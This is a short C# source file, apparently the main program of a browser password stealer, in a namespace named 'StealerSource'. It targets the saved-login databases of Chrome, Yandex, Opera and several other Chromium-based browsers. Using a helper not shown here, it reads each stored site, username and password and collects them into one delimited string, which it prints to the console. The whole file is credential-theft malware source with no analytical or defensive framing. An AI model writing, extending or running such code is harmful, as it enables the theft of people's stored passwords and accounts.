using System;
using System.Collections.Generic;

namespace StealerSource
{
    class Program
    {
        private static string[] BasePaths =
        {
            Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
            Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
            Environment.GetEnvironmentVariable("LocalAppData") + "\\Kometa\\User Data\\Default\\Login Data",
            Environment.GetEnvironmentVariable("LocalAppData") + "\\Amigo\\User\\User Data\\Default\\Login Data",
            Environment.GetEnvironmentVariable("LocalAppData") + "\\Torch\\User Data\\Default\\Login Data",
            Environment.GetEnvironmentVariable("LocalAppData") + "\\Orbitum\\User Data\\Default\\Login Data",
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data"
        };
        public static void Main(string[] args)
        {
            string Result = String.Empty;
            foreach (string BasePath in BasePaths)
            {
                List<Table> Logins = Chromium.Get(BasePath);
                if (Logins == null) continue;
                foreach (Table UData in Logins)
                {
                    string Temp = String.Join("|", new string[] { UData.Url.Replace("http://", String.Empty).Replace("https://", String.Empty).Replace("www.", String.Empty), UData.Login, UData.Password }) + ";";
                    if (String.IsNullOrWhiteSpace(UData.Login) || String.IsNullOrWhiteSpace(UData.Password) || Result.Contains(Temp)) continue;
                    Result += Temp;
                }
            }
            Console.WriteLine(Result);
        }
    }
}
